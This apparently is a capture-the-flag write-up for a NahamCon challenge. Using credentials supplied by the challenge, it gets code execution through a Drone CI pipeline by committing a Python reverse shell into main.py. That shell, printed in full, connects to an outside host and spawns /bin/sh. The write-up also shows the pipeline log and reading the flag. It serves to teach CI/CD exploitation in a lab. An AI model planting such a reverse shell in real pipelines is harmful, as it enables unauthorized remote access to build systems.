# Dizzy

> Someone leaked their git credentials (developer:2!W4S5J$6e). Can you get in?
> 
> This challenge uses vhosts.
> Visit git.challenge.nahamcon.com:[YOUR_PORT]
> Visit drone.challenge.nahamcon.com:[YOUR_PORT]

This is very similar to the RaaS challenge, but with a few differences. Instead of doing a simple command injection, this time we will upload some actual bad code to the repo.


Start by logging in to the Git repo. Observe the Drone CI/CD pipeline definition file `.drone.yml`:
```
---
kind: pipeline
type: exec
name: default

platform:
  os: linux
  arch: amd64

steps:
  - name: test
    commands:
      - python -m venv env
      - . ./env/bin/activate
      - pip install -r requirements.txt --extra-index-url http://localhost:8000 --trusted-host 127.0.0.1
      - python main.py
---
kind: signature
hmac: 80e282d0f78104e9d3b003116add30996c7fb927feba936f3e8b83a4a4b5ca47

...
```

Clearly no command injection we can leverage here, but the pipeline includes a step to run `main.py`. 

1. As the repo has branch protection turned on, fork it to our own.
2. Add the droneci user as a collaborator on our forked repo.
3. Go to DroneCI home page and refresh, after step #2 we should see our forked repo listed. Make sure it's enabled.
4. Change code in `main.py` to include a reverse shell (see below) and commit
5. Pipeline should run. Observe outpus:

```
+ python -m venv env
+ . ./env/bin/activate
+ pip install -r requirements.txt --extra-index-url http://localhost:8000 --trusted-host 127.0.0.1
Looking in indexes: https://pypi.org/simple, http://localhost:8000
Collecting calculator_3bbbf94efb2b1945
  Downloading http://localhost:8000/packages/calculator_3bbbf94efb2b1945-0.0.1.tar.gz (1.3 kB)
  Installing build dependencies: started
  Installing build dependencies: finished with status 'done'
  Getting requirements to build wheel: started
  Getting requirements to build wheel: finished with status 'done'
  Preparing metadata (pyproject.toml): started
  Preparing metadata (pyproject.toml): finished with status 'done'
Building wheels for collected packages: calculator_3bbbf94efb2b1945
  Building wheel for calculator_3bbbf94efb2b1945 (pyproject.toml): started
  Building wheel for calculator_3bbbf94efb2b1945 (pyproject.toml): finished with status 'done'
  Created wheel for calculator_3bbbf94efb2b1945: filename=calculator_3bbbf94efb2b1945-0.0.1-py3-none-any.whl size=1821 sha256=7477421fe18f1b6eff8e579df966187f2122d452fbb8ebe07ab074d079c84936
  Stored in directory: /tmp/drone-SVRLqUipdb7oNuXr/home/drone/.cache/pip/wheels/c8/d0/25/d2f4b43d84ee567fef02a1460022c231dbfd8382b180de41dd
Successfully built calculator_3bbbf94efb2b1945
Installing collected packages: calculator_3bbbf94efb2b1945
Successfully installed calculator_3bbbf94efb2b1945-0.0.1
WARNING: You are using pip version 22.0.4; however, version 22.3.1 is available.
You should consider upgrading via the '/tmp/drone-SVRLqUipdb7oNuXr/drone/src/env/bin/python -m pip install --upgrade pip' command.
+ python main.py
```

After `python main.py` runs no output as we have started a reverse shell with below code:
```
import socket;
import os;
import subprocess;
import pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ngrok_host",port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")
```

Switching to our netcat term, I can see we have a shell, and then can grab the flag:
```
(env) # ls /
ls /
bin   dev                etc       home  lib64  mnt  port  root  sbin  sys  usr
boot  drone-runner-exec  flag.txt  lib   media  opt  proc  run   srv   tmp  var
(env) # cat /flag.txt
cat /flag.txt
flag{12c7f
```

Our reverse shell will live as long as the timeout is for the pipeline; I believe default DroneCI value is 60 minutes.

Thanks again to congon4tor for the challenge!
